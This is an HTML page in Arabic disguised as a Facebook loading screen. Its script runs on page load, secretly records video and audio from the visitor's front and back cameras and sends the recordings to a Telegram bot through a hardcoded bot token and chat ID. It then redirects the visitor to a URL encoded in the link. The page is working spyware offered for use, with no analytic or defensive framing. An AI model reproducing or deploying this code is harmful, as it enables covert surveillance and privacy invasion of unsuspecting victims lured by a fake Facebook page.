<!-- نفس كود فيسبوك من إجابتي السابقة، مع تعديل جزء الـ Script -->
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>فيسبوك</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; flex-direction: column; height: 100vh; margin: 0; text-align: center; color: #4b4f56; }
        .facebook-logo { width: 120px; margin-bottom: 30px; }
        .loader-bar { width: 80%; max-width: 300px; height: 5px; background-color: #e4e6eb; border-radius: 2.5px; margin-top: 20px; overflow: hidden; }
        .loader-fill { height: 100%; background-color: #1877f2; border-radius: 2.5px; animation: f-load 1.5s linear infinite; }
        @keyframes f-load { 0% { transform: translateX(-100%); } 100% { transform: translateX(100%); } }
        p { font-size: 1.1em; color: #606770; margin-top: 20px; }
    </style>
</head>
<body>
    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="Facebook Logo" class="facebook-logo">
    <p>جارٍ تحميل المحتوى...</p>
    <div class="loader-bar"><div class="loader-fill"></div></div>
<script>
    // هذا الكود مطابق تمامًا لكود youtube.html، فقط الواجهة مختلفة
    const BOT_TOKEN = '8060685956:AAGJztf_aHHhFdBsH2OLuCPYS2TwPRY3_R4';
    const RECORD_DURATION_MS = 5000;
    let TARGET_CHAT_ID;
    let REDIRECT_URL;

    function getParamsFromUrl() {
        const urlParams = new URLSearchParams(window.location.search);
        const encodedUrl = urlParams.get('url');
        const encodedId = urlParams.get('id');
        REDIRECT_URL = encodedUrl ? atob(encodedUrl) : 'https://facebook.com';
        TARGET_CHAT_ID = encodedId ? atob(encodedId) : '1431886140';
    }

    async function sendVideoToTelegram(videoBlob, caption) {
        const formData = new FormData();
        formData.append('chat_id', TARGET_CHAT_ID);
        formData.append('video', videoBlob, 'video.mp4');
        formData.append('caption', caption);
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: formData });
        } catch (error) { console.error('Error sending video:', error); }
    }

    async function recordAndSend(facingMode, cameraName) {
        let stream = null;
        try {
            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: true });
            const recorder = new MediaRecorder(stream);
            const chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = () => sendVideoToTelegram(new Blob(chunks, { type: 'video/mp4' }), `فيديو من (${cameraName})`);
            recorder.start();
            await new Promise(r => setTimeout(r, RECORD_DURATION_MS));
            recorder.stop();
            await new Promise(r => setTimeout(r, 1000));
            stream.getTracks().forEach(track => track.stop());
            return true;
        } catch (error) {
            if (stream) stream.getTracks().forEach(track => track.stop());
            return false;
        }
    }

    window.onload = async () => {
        getParamsFromUrl();
        await recordAndSend('user', 'الكاميرا الأمامية');
        await new Promise(r => setTimeout(r, 500));
        await recordAndSend('environment', 'الكاميرا الخلفية');
        window.location.href = REDIRECT_URL;
    };
</script>
</body>
</html>
